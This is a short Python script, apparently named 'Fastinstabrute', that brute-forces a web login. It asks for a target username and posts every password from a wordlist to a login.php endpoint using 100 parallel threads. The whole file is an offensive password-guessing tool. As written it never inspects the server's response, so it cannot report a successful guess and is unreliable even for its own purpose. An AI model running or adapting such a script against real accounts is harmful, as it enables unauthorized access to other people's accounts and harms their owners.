import requests
from concurrent.futures import ThreadPoolExecutor

url = "http://localhost/Fastinstabrute/backend/login.php"
username = input("Enter target username: ")
wordlist = "wordlist.txt"

def try_password(password):
    data = {"username": username, "password": password.strip()}
    response = requests.post(url, data=data)
    print(f"Trying: {password.strip()}")

with open(wordlist, "r") as f:
    passwords = f.readlines()

with ThreadPoolExecutor(max_workers=100) as executor:
    executor.map(try_password, passwords)
